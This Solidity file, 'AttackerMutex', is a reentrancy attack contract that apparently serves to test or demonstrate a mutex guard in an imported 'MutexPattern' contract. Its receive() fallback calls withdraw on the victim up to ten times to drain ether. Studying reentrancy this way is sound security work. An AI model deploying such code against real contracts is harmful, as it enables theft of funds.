pragma solidity ^0.7.0;

import './MutexPattern.sol';

contract AttackerMutex {
  MutexPattern v;
  uint256 public count;
  uint amount = 1 ether;
  address payable public victimAddress;

  event LogFallback(uint c, uint balance);

  constructor (MutexPattern victim) {
    victimAddress = address(victim);
    v = MutexPattern(victimAddress);
  }

  receive () external payable {
    count++;
    emit LogFallback(count, address(this).balance);
    if (count < 10) {
      v.withdraw(amount);
    } 
  }

   function setBalance() public payable {
     victimAddress.call{value: msg.value}("");
  }

  function attack () public {
    v.withdraw(amount);
  }
}